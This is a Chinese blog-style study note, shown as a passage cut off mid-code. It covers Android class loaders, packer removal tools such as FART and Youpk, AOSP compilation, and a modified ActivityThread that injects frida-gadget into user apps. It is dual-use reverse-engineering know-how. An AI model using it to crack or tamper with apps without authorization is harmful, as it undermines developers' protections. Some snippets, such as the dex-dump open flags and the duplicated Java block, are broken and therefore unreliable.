    
    <entry>
      <title>刷机与脱壳机入门</title>
      <link href="/posts/e65d2ab6.html"/>
      <url>/posts/e65d2ab6.html</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>某脱壳在线网站：<a href="https://nop.gs/">APK加固安全测试 (nop.gs)</a></p><p><code>grep -ril &quot;MainActivity&quot; /*.txt</code></p><p>在指定目录的所有文件和子目录中搜索，过滤</p><ul><li>xjb移植到Android 10中的fart，在抽取脱壳时出现.bin和.dex文件，使用如下命令合并</li></ul><p><code>java -jar dexfixer.jar dexpath binpath outdexpath</code></p><ul><li>如何工程打包jar包<br>File-&gt;Project Structure-&gt;Artifacts-&gt;’+’-&gt;JAR-&gt;From modules with<img src="2025-01-15-刷机与脱壳机入门/image-20240127170637673.png" alt="image-20240127170637673"></li></ul><p>然后Build-&gt;Build Artifacts，然后在左侧classes文件夹找生成的jar包    </p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="JVM的类加载器包括3种："><a href="#JVM的类加载器包括3种：" class="headerlink" title="JVM的类加载器包括3种："></a><strong>JVM的类加载器包括3种：</strong></h3><p>1）Bootstrap ClassLoader（引导类加载器）</p><p>C/C++代码实现的加载器，用于加载指定的JDK的核心类库，比如java.lang.、java.uti.等这些系</p><p>统类。Java虚拟机的启动就是通过Bootstrap ，该Classloader在java里无法获取，负责加载/lib下的</p><p>类。</p><p>2）Extensions ClassLoader（拓展类加载器）</p><p>Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在java里获取，</p><p>负责加载/lib/ext下的类。</p><p>3）Application ClassLoader（应用程序类加载器）</p><p>Java中的实现类为AppClassLoader，是与我们接触最多的类加载器，开发人员写的代码默认</p><p>就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它</p><p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可。</p><p>ClassLoader的继承关系</p><h3 id="加载顺序"><a href="#加载顺序" class="headerlink" title="加载顺序"></a><strong>加载顺序</strong></h3><p>我们看到了系统的3个类加载器，但我们可能不知道具体加载的顺序呢？</p><p>\1. Bootstrap CLassloder</p><p>\2. Extention ClassLoader</p><p>\3. AppClassLoader<img src="2025-01-15-刷机与脱壳机入门/image-20240123232152530.png" alt="image-20240123232152530"></p><h2 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h2><p>双亲委派模式的工作原理的是：如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把</p><p>这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递</p><p>归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类</p><p>加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都不愿意</p><p>干活，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成，这个就是双</p><p>亲委派。</p><p>为什么要有双亲委派？</p><p>1）避免重复加载，如果已经加载过一次Class，可以直接读取已经加载的Class </p><p>2）更加安全，无法自定义类来替代系统的类，可以防止核心API库被随意篡改</p><p><strong>类加载的时机：</strong></p><p>1、隐式加载：</p><p>创建类的实例</p><p>访问类的静态变量，或者为静态变量赋值</p><p>调用类的静态方法</p><p>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</p><p>初始化某个类的子类</p><p>系统进行加载</p><p>2、显示加载：两者又有所区别</p><p>使用LoadClass（）加载，有两个参数第一个参数是类名，第二个是true/false，不写默认false ==》不初始化类</p><p>使用forName（）加载，有两个参数：（类名，ClassLoader），会初始化类</p><p><strong>通过源码分析Android下类加载的流程</strong></p><p>1、加载：查找和导入Class文件</p><p>2、连接：其中解析步骤是可以选择的</p><p>（a）验证：检查载入的class文件数据的正</p><p>确性</p><p>（b）准备：给类的静态变量分配存储空间</p><p>（c）解析：将符号引用转成直接引用</p><p>3、初始化：即调用<clinit>函数，对静态变量，静态代码块执行初始化工作</p><p><img src="2025-01-15-刷机与脱壳机入门/image-20240123232507241.png" alt="image-20240123232507241"></p><h2 id="Android类加载器"><a href="#Android类加载器" class="headerlink" title="Android类加载器"></a><strong>Android类加载器</strong></h2><p>Android系统中的</p><p>ClassLoader的继承关系</p><p>其中，InMemoryDexClassLoader为</p><p>Android8.0新引入的ClassLoader<img src="2025-01-15-刷机与脱壳机入门/image-20240123232543680.png" alt="image-20240123232543680"></p><p>Android系统中与ClassLoader相关的一共有8个：</p><p>ClassLoader为抽象类；</p><p>BootClassLoader预加载常用类，单例模式,用来加载系统类。与Java中的BootClassLoader不同，它并不是由C/C++代码实现，而是由Java实现的；</p><p>BaseDexClassLoader是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的</p><p>主要逻辑都是在BaseDexClassLoader完成的。</p><p>SecureClassLoader继承了抽象类ClassLoader，拓展了ClassLoader类加入了权限方面的功能，加强了安</p><p>全性，其子类URLClassLoader是用URL路径从jar文件中加载类和资源。</p><p>其中<strong>重点关注</strong>的是<strong>PathClassLoader</strong>和<strong>DexClassLoader</strong>。</p><p>PathClassLoader是Android默认使用的类加载器，一个apk中的Activity等类便是在其中加载。</p><p>DexClassLoader可以加载任意目录下的dex/jar/apk/zip文件，比PathClassLoader更灵活，是实现插件</p><p>化、热修复以及dex加壳的重点。</p><p>Android8.0新引入InMemoryDexClassLoader，从名字便可看出是用于直接从内存中加载dex</p><h3 id="DexClassLoader参数介绍"><a href="#DexClassLoader参数介绍" class="headerlink" title="DexClassLoader参数介绍"></a>DexClassLoader参数介绍</h3><p>接下来使用DexClassLoader类实现一个最简单的动态加载插件dex，并验证此时的ClassLoader间的继承关系；</p><p>DexClassLoader方法参数：</p><p>dexPath:目标所在的apk或者jar文件的路径，装载器将从路径中寻找指定的目标类。</p><p>dexOutputDir:由于dex 文件在APK或者 jar文件中，所以在装载前面前先要从里面解压出dex文件，这个路径就是dex文件存放的路径，在android系统中，一个应用程序对应一个linux用户id ,应用程序只对自己的数据目录有写的权限，所以我们存放在这个路径中。</p><p>libPath :目标类中使用的C/C++库。</p><p>最后一个参数是该装载器的父装载器，一般为当前执行类的装载器。</p><p><strong>源码分析Android中的LoadClass和</strong></p><p>forName的流程和区别</p><p>使用LoadClass（）加载</p><p>使用forName（）加载<br><img src="2025-01-15-刷机与脱壳机入门/image-20240123232731529.png" alt="image-20240123232731529"></p><p>app运行流程<br><img src="2025-01-15-刷机与脱壳机入门/image-20240123232814798.png" alt="image-20240123232814798"></p><p>1、何时进行dex的解密？</p><p>2、如何解决动态加载的dex中的类的生命周期问题<br><img src="2025-01-15-刷机与脱壳机入门/image-20240123232844631.png" alt="image-20240123232844631"></p><p>DexClassLoader加载的类是没有组件生命周期的，也就是说即使DexClassLoader通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常。为什么组件类被动态加载入虚拟机，但系统却出现加载类失败呢？</p><p>两种解决方案：</p><p>1、替换系统组件类加载器为我们的DexClassLoader，同时设置DexClassLoader的parent为系统组件类加载器；</p><p>2、打破原有的双亲关系，在系统组件类加载器和BootClassLoader的中间插入我们自己的DexClassLoader即可；<br><img src="2025-01-15-刷机与脱壳机入门/image-20240123232947710.png" alt="image-20240123232947710"></p><p><img src="2025-01-15-刷机与脱壳机入门/image-20240123232959009.png" alt="image-20240123232959009"></p><h2 id="抽取加固"><a href="#抽取加固" class="headerlink" title="抽取加固"></a>抽取加固</h2><h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p>提取出dex中方法体的字节码，并在方法运行时还原</p><h3 id="实现形式"><a href="#实现形式" class="headerlink" title="实现形式"></a>实现形式</h3><ul><li>抽空方法体代码，运行方法后回填，运行后不再抽取—&gt;延时保存</li><li>抽空方法体代码，运行方法后回填，运行完后又抽取—&gt;FART,Youpk主动调用</li><li>抽空方法体代码，将原有函数体替换为解密代码，运行时解密执行</li></ul><h3 id="对原有dex处理形式"><a href="#对原有dex处理形式" class="headerlink" title="对原有dex处理形式"></a>对原有dex处理形式</h3><p>1）原有函数体数据空间置0，保留原有空间</p><p>2）对dex重构，不保留原空间，在还原数据时修改CodeltemOffset</p><h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><ul><li>在函数运行时保存被抽取的数据</li></ul><h4 id="被动调用"><a href="#被动调用" class="headerlink" title="被动调用"></a>被动调用</h4><p>app正常运行过程中所发生的函数调用只对dex中部分类完成加载，只对dex中部分函数完成调用，调用函数不全，导致能够恢复函数有限</p><h4 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h4><p>构造虚拟调用，对所有函数完成调用，在这些函数执行时，保存数据体Codeltem数据，保存数据时机越晚效果越好</p><p>常见抽取加固脱壳系统</p><ul><li>DexHunter(被动调用)</li><li>Fupk3(Dalvik)</li><li>FART</li><li>Youpk</li></ul><h2 id="其他加固形式"><a href="#其他加固形式" class="headerlink" title="其他加固形式"></a>其他加固形式</h2><h3 id="VMP"><a href="#VMP" class="headerlink" title="VMP"></a>VMP</h3><p><a href="https://github.com/chago/ADVMP">https://github.com/chago/ADVMP</a></p><p>VMP保护一般针对部分函数，这些函数会被native化，定位解释器是关键，找到映射关系便可恢复。vmp通常共用一个解释器。被VMP保护的函数通常会注册到同一个地址上，或者函数逻辑相似</p><h3 id="dex2c"><a href="#dex2c" class="headerlink" title="dex2c"></a>dex2c</h3><p><a href="https://github.com/amimo/dcc">https://github.com/amimo/dcc</a>  支持定制</p><p>通过此法分析，语法分析等，进行Java到C的等价转化，彻底还原难度大，会有大量的jni相关的API调用</p><p>dex2C通常注册在不同的地址上，并且函数逻辑不相似。</p><h2 id="脱壳的一些常用方法"><a href="#脱壳的一些常用方法" class="headerlink" title="脱壳的一些常用方法"></a>脱壳的一些常用方法</h2><p>对于整体加固：</p><p>1）脱壳工具fdex2：</p><p>通过Class类的getDex方法获得DexFile，再通过DexFile的getBytes方法得到dex文件，安卓7.1以下使用，8.0之后没有getDex和getBytes方法了。</p><p>2）脱壳工具blackdex</p><p>通过mCookie来脱壳</p><p>3）脱壳工具Frid-dexdump</p><p>内存中搜索dex文件保存下来</p><p>4）脱壳系统Fart,Youpk</p><p>dex加载，执行过程中，找一个合适的时机得到DexFile内存地址和大小，将解密的dex保存下来</p><p>还可以通过artMethod来得到DexFile</p><p>5）找到相应脱壳点，进行dump</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DexFile OpenCommon</span></span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>();</span><br><span class="line"><span class="type">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d 脱壳点函数名.dex&quot;</span>,length,pid);</span><br><span class="line"><span class="type">int</span> fd=<span class="built_in">open</span>(dexfilepath,<span class="number">0</span> CREAT|<span class="number">0</span> RDWR,<span class="number">666</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="type">int</span> number=<span class="built_in">write</span>(fd,addr,length);</span><br><span class="line">    <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6）dexhunter</p><p>遍历dex当中所有的类，然后主动进行加载和初始化</p><p>fupk3基于Dalvik Android4.4</p><h2 id="ART下的脱壳点"><a href="#ART下的脱壳点" class="headerlink" title="ART下的脱壳点"></a>ART下的脱壳点</h2><p>抽取加固首先干掉dex2oat，或者填充时机在oat之前</p><p>1）dex的加载流程  （整体加固）</p><ul><li>通过mCookie脱壳    mCookie是jlongarray数组 存放DexFile对象指针</li><li>通过openCommen函数脱壳</li><li>通过DexFile构造函数脱壳</li><li>youpk：通过ClassLinker来得到DexFile</li></ul><p>2）dex2oat的编译流程==》把dex文件变为oat文件 （整体加固）</p><ul><li>通过修改dex2oat脱壳的     安卓10的应用不适用，但是系统应用仍使用dex2oat</li></ul><p>3）类的加载和初始化流程  （抽取加固）</p><ul><li>DexHunter在defineClass进行类解析  （基于被动调用）    </li><li>LoadMethod、LinkCode</li></ul><p>4）在函数执行过程中脱壳</p><ul><li>FART：Execute整体脱壳 （整体脱壳点）</li><li>FART：ArtMethod::invoke函数中进行dump Codeltem  （抽取脱壳点）</li><li>youpk：直接到了解释执行的函数中进行dump Codeltem</li></ul><h1 id="Android系统编译"><a href="#Android系统编译" class="headerlink" title="Android系统编译"></a>Android系统编译</h1><p>安卓系统编译前置知识</p><ul><li>aosp源码，对应的Linux内核，对应的手机驱动。对应是指要跟aosp系统版本对应，要与手机型号对应</li></ul><h2 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h2><p>网址：<a href="https://mirrors.ustc.edu.cn/help/aosp.html">AOSP 镜像使用帮助 — USTC Mirror Help 文档</a></p><p>​           <a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">AOSP | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><h2 id="下载初始化包并解压"><a href="#下载初始化包并解压" class="headerlink" title="下载初始化包并解压"></a>下载初始化包并解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/bin</span><br><span class="line"><span class="built_in">cd</span> ~/bin</span><br><span class="line">wget https://mirrors.ustc.edu.cn/aosp-monthly/aosp-latest.tar</span><br><span class="line">（可以使用wget -c 支持断点下载）</span><br><span class="line"><span class="built_in">md5sum</span> aosp-latest.tar (校验是否下载完整)</span><br><span class="line">tar xvf aosp-latest.tar</span><br></pre></td></tr></table></figure><h2 id="同步指定版本源码"><a href="#同步指定版本源码" class="headerlink" title="同步指定版本源码"></a>同步指定版本源码</h2><p>解压完tar包后打个快照，因为只能编译一个指定版本的源码。编译多个会出错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">解压完进入aosp目录</span><br><span class="line"><span class="built_in">cd</span> aosp</span><br><span class="line"><span class="built_in">sudo</span> apt-get install git</span><br><span class="line">git config --global user.email 644129939@qq.com</span><br><span class="line">git config --global user.name <span class="string">&quot;zxk1ng&quot;</span></span><br><span class="line"></span><br><span class="line">//下载repo</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=~/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line"><span class="built_in">sudo</span> apt-get install curl</span><br><span class="line">curl -sSL <span class="string">&#x27;https://gerrit-googlesource.proxy.ustclug.org/git-repo/+/master/repo?             format=TEXT&#x27;</span> |<span class="built_in">base64</span> -d &gt;~/bin/repo</span><br><span class="line"><span class="built_in">chmod</span> a+x ~/bin/repo</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">export</span> REPO_URL=<span class="string">&#x27;https://gerrit-googlesource.proxy.ustclug.org/git-repo&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> aosp</span><br><span class="line"></span><br><span class="line">//同步指定版本源码</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line">repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-10.0.0_r17</span><br><span class="line"></span><br><span class="line">repo <span class="built_in">sync</span></span><br><span class="line">/*</span><br><span class="line">当repo <span class="built_in">sync</span>报错：</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/.repo/repo</span><br><span class="line">git pull</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp</span><br><span class="line">再次repo init、repo <span class="built_in">sync</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//代码和细分版本号可查看下面链接 选有驱动支持手机多的，快照</span><br><span class="line">(https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn)</span><br></pre></td></tr></table></figure><h2 id="获取手机驱动"><a href="#获取手机驱动" class="headerlink" title="获取手机驱动"></a>获取手机驱动</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//安装jdk8</span><br><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:openjdk-r/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安装所需要的依赖（ubuntu20.04）</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install git-core gnupg flex bison build-essential zip curl zlib1g-<span class="built_in">dev</span> gcc-multilib g++-multilib libc6-<span class="built_in">dev</span>-i386 lib32ncurses5-<span class="built_in">dev</span> x11proto-core-<span class="built_in">dev</span> libx11-<span class="built_in">dev</span> lib32z1-<span class="built_in">dev</span> libgl1-mesa-<span class="built_in">dev</span> libxml2-utils xsltproc unzip fontconfig libncurses5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设备驱动准备</p><p><a href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></p><p>下载和你导出的源码版本匹配的驱动，例如<img src="2025-01-15-刷机与脱壳机入门/image-20240129152507615.png" alt="image-20240129152507615"></p><p>下载的是Android 10.0.0_r17，所以下载上面两个驱动</p><p>下载-&gt;放到linux中的aosp目录中解压，运行解压出来的两个.sh文件</p><h2 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//aosp目录下</span><br><span class="line">make clobber (如果同一源码编译不同机型输入这个命令)</span><br><span class="line"><span class="built_in">source</span> build/envsetup.sh 导出环境变量</span><br><span class="line">lunch<span class="comment"># 选择设备内核和编译版本  eng/user/usrdebug</span></span><br><span class="line"><span class="comment"># 增加编译产品选项 修改aosp/device/google/marlin/AndroidProducts.mk(照猫画虎)</span></span><br><span class="line">选择要编译的设备内核</span><br><span class="line">make -j8 <span class="comment">#编译</span></span><br></pre></td></tr></table></figure><h2 id="编译补充"><a href="#编译补充" class="headerlink" title="编译补充"></a>编译补充</h2><ul><li><p>编译报错或者修改系统文件后，都可以直接make，已经编译的部分会跳过</p></li><li><p>make clean 会清除已经编译的，重新再来，在编译不同lunch选项时使用</p></li><li><p>单独编译system.img 在根目录在<br>source build/envsetup.sh</p><p>lunch xxx<br>make systemimage -j4</p></li><li><p>单独编译某个模块 mmm packages/apps/zxk1ng<br>将单独编译的模块打包到img镜像中 make snod</p></li></ul><h2 id="导入aosp到AndroidStudio"><a href="#导入aosp到AndroidStudio" class="headerlink" title="导入aosp到AndroidStudio"></a>导入aosp到AndroidStudio</h2><p>编译成功一程android源码后</p><p>1）在aosp目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">mmm development/tools/idegen/</span><br><span class="line">development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure><p>2）下载Android-Studio: wget+网址</p><p>3）设置中,Appearance-&gt;System Settings-&gt;Memory Settings 修改内存为4096</p><p>4）设置中：Android SDK 下载安卓10 API，NDK，Cmake</p><p>5）导入安卓10源码文件Android.ipr</p><h1 id="Frida持久化"><a href="#Frida持久化" class="headerlink" title="Frida持久化"></a>Frida持久化</h1><h2 id="Hook前提"><a href="#Hook前提" class="headerlink" title="Hook前提"></a>Hook前提</h2><p>需要将代码或者能够完成Hook功能的东西，注入到目标进程</p><p>注入方式：</p><ul><li>zygote注入：xposed使用这个注入方式，xposedBridge.jar会注入到fork出来的所有进程</li><li>ptrace注入：需要root权限,利用安卓系统功能文件注入相应进程（frida-server）</li><li>文件感染：当加载一个so文件的时候，会先去加载依赖的.so文件，我们可以修改依赖让其加载其他的so文件</li></ul><h2 id="frida-gadget"><a href="#frida-gadget" class="headerlink" title="frida-gadget"></a>frida-gadget</h2><p>当Hook代码修改检测完毕，可以通过它来实现免root，脱离PC，但是它本身没有注入功能，需要将其打包到app中。</p><p>把libfrida-gadget.so(官网下载)文件放入lib文件下的某个arm文件夹中，在准备一个配置文件，libfrida-gadget.config.so，内容为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//脚本模式，加载这个js脚本</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;interaction&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;script&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/home/oleavr/explore.js&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//脚本模式，加载多个js脚本，放入一个目录中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;interaction&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;script-directory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/usr/local/frida/scripts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app如何加载这个libfrida-gadget.so呢？</p><p>所以我们要修改app代码(.dex文件)让原本app来加载这个so文件，在app入口添加如下代码：</p><p><img src="2025-01-15-刷机与脱壳机入门/image-20240131185225259.png" alt="image-20240131185225259"></p><p>smail形式为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#direct methods</span><br><span class="line">.<span class="property">method</span> <span class="keyword">static</span> constructor &lt;clinit&gt;()V</span><br><span class="line">.<span class="property">register</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">.<span class="property">prologue</span></span><br><span class="line"><span class="keyword">const</span>-string v0,<span class="string">&quot;frida-gadget&quot;</span></span><br><span class="line"></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, <span class="title class_">Ljava</span>/lang/<span class="title class_">System</span>;-&gt;<span class="title function_">loadLibrary</span>(<span class="title class_">Ljava</span>/lang/<span class="title class_">String</span>;)V</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.<span class="property">end</span> method</span><br></pre></td></tr></table></figure><p>然后在进行回编译打包。</p><p>但是有些app验证签名或者不能重打包。</p><p>所以 <strong>魔改系统</strong></p><p>在app启动过程中，自动加载frida-gadget，更通用。</p><h2 id="修改app启动流程"><a href="#修改app启动流程" class="headerlink" title="修改app启动流程"></a>修改app启动流程</h2><p>在安卓系统源码中的ActivityThread类下找handleBandApplication方法，在<code>app=data.info.makeApplication(data.restrictedBackupMode)</code>前面添加代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">curPkgName</span> <span class="operator">=</span> data.appInfo.packageName;   <span class="comment">//获取包名</span></span><br><span class="line"><span class="type">int</span> <span class="variable">curUid</span> <span class="operator">=</span> Process.myUid();</span><br><span class="line"><span class="keyword">if</span>(curUid&gt;<span class="number">10000</span>)&#123;                               <span class="comment">//系统app一般小于10000 过滤系统app</span></span><br><span class="line">    Persist.LOGD(); <span class="type">String</span> <span class="variable">curPkgName</span> <span class="operator">=</span> data.appInfo.packageName;</span><br><span class="line">        <span class="type">int</span> <span class="variable">curUid</span> <span class="operator">=</span> Process.myUid();</span><br><span class="line">        <span class="keyword">if</span> (curUid &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">            Persist.LOGD(<span class="string">&quot;curPkgName: &quot;</span> + curPkgName + <span class="string">&quot; curUid: &quot;</span> + curUid);</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">isPersist</span> <span class="operator">=</span> Persist.isEnablePersist(curPkgName);   <span class="comment">//是否注入fridagadget</span></span><br><span class="line">            Persist.LOGD(<span class="string">&quot;isPersist: &quot;</span> + isPersist);</span><br><span class="line">            <span class="keyword">if</span> (isPersist) &#123;</span><br><span class="line">                <span class="keyword">if</span>(Persist.doXiaojianbangPersist(appContext, curPkgName))&#123;  <span class="comment">//加载fridagadget</span></span><br><span class="line">                    Persist.LOGD(<span class="string">&quot;doXiaojianbangPersist is ok&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    Persist.LOGD(<span class="string">&quot;doXiaojianbangPersist failed&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义包和类"><a href="#自定义包和类" class="headerlink" title="自定义包和类"></a>自定义包和类</h2><p>上面修改app流程的一些方法和Persist类是自定义的，将这个包导入安卓系统源码中的ActivityThread类，具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 